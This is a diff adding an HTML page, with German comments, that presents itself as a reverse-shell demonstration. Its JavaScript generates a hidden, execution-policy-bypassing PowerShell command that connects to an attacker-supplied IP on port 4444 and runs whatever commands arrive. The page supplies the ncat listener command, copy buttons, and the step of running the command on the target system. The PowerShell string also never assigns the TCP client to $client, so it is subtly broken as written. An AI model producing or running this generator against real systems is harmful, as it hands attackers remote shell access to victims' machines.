@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Reverse Shell</title>
+  <style>
+    /* ============  EINFACHE STYLES  ============ */
+    body {
+      font-family: sans-serif;
+      margin: 20px;
+    }
+    h2 {
+      margin-top: 0;
+    }
+    .hidden {
+      display: none;
+    }
+    .read-more-btn {
+      cursor: pointer;
+      color: blue;
+      text-decoration: underline;
+      display: inline-block;
+      margin-top: 10px;
+    }
+    /* Eingeklappt */
+    .read-more-btn.collapsed::after {
+      content: " Read more";
+    }
+    /* Ausgeklappt */
+    .read-more-btn.expanded::after {
+      content: " Read less";
+    }
+    button {
+      cursor: pointer;
+      margin: 6px 0;
+      padding: 4px 8px;
+    }
+    input[type="text"] {
+      margin: 6px 0;
+      padding: 4px;
+      width: 220px;
+    }
+    pre {
+      background: #f4f4f4;
+      padding: 8px;
+      border: 1px solid #ccc;
+      white-space: pre-wrap; /* Lange Zeilen umbrechen */
+      word-wrap: break-word;
+    }
+  </style>
+
+  <script>
+    /**
+     * Zeigt oder versteckt den Inhalt und wechselt den Buttontext
+     * zwischen "Read more" und "Read less".
+     */
+    function toggleReadMore(button) {
+      const content = button.previousElementSibling; // read-more-content
+      content.classList.toggle('hidden'); 
+      button.classList.toggle('collapsed');
+      button.classList.toggle('expanded');
+    }
+
+    /**
+     * Kopiert den Inhalt (innerText) eines Elements in die Zwischenablage.
+     * @param {string} elementId - ID des Elements, das kopiert werden soll.
+     */
+    function copyToClipboard(elementId) {
+      const copyText = document.getElementById(elementId).innerText;
+      navigator.clipboard.writeText(copyText)
+        .then(() => alert('Copied to clipboard'))
+        .catch(err => alert('Failed to copy text: ' + err));
+    }
+
+    /**
+     * Liest die IP aus einem Input-Feld aus und baut daraus
+     * dynamisch einen PowerShell-Reverse-Shell-Befehl.
+     */
+    function generatePowerShellCommand() {
+      const attackerIP = document.getElementById('attackerIP').value.trim();
+      if (!attackerIP) {
+        alert('Please enter a valid IP address.');
+        return;
+      }
+      // PowerShell Reverse Shell Command
+      const command = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "` +
+        `New-Object System.Net.Sockets.TCPClient('${attackerIP}',4444);` +
+        `$stream = $client.GetStream();` +
+        `[byte[]]$bytes = 0..65535|%{0};` +
+        `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){` +
+          `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);` +
+          `$sendback = (iex $data 2>&1 | Out-String );` +
+          `$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';` +
+          `$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);` +
+          `$stream.Write($sendbyte,0,$sendbyte.Length);` +
+          `$stream.Flush()` +
+        `}"`;
+
+      const commandElement = document.getElementById('powershellCommand');
+      commandElement.innerText = command;
+    }
+  </script>
+</head>
+<body>
+
+  <h2>Reverse Shell</h2>
+  <p>Reverse Shells sind eine Methode, bei der die Eingabe und Ausgabe einer Shell an einen entfernten Dienst weitergeleitet wird. So kann man eine Shell remote kontrollieren.</p>
+  <p>Dieser Abschnitt demonstriert ein Beispiel dafür:</p>
+
+  <!-- read-more-content beim Laden ausgeblendet -->
+  <div class="read-more-content hidden">
+    <p>1. Stelle sicher, dass auf deinem Angreifer-Rechner netcat (oder ncat) vorhanden ist. Damit kannst du auf Port 4444 lauschen:</p>
+    <p><strong>Netcat command:</strong></p>
+    <pre id="netcatCommand">ncat -lvnp 4444</pre>
+    <button onclick="copyToClipboard('netcatCommand')">Copy Netcat Command</button>
+
+    <p>2. Gib die IP des Angreifers (deine IP) in das folgende Feld ein und klicke auf "Generate PowerShell Command".</p>
+    <input type="text" id="attackerIP" placeholder="Enter IP Address" />
+    <button onclick="generatePowerShellCommand()">Generate PowerShell Command</button>
+
+    <p>3. Den generierten PowerShell-Befehl auf das Zielsystem übertragen und ausführen.</p>
+    <p><strong>PowerShell Reverse Shell Command:</strong></p>
+    <pre id="powershellCommand"></pre>
+    <button onclick="copyToClipboard('powershellCommand')">Copy PowerShell Command</button>
+  </div>
+
+  <!-- Button, um Inhalt ein- oder auszublenden -->
+  <div 
+    class="read-more-btn collapsed" 
+    onclick="toggleReadMore(this)"
+    title="Klicke, um den Abschnitt aufzuklappen">
+  </div>
+
+</body>
+</html>
